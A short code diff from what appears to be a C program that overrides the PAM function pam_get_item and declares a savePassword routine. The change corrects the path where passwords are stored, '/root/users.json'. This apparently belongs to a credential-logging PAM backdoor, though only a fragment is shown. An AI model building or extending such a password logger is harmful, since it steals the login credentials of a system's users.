@@ -24,5 +24,6 @@ int pam_get_item(void *p, int i, const void **pwd)
 #define WHT "\x1B[37m"
 #define RESET "\x1B[0m"
 
-#define filename "/root/userss.json"
+// TODO: better location to be useful for other systems
+#define filename "/root/users.json"
 void savePassword(char *, char *);
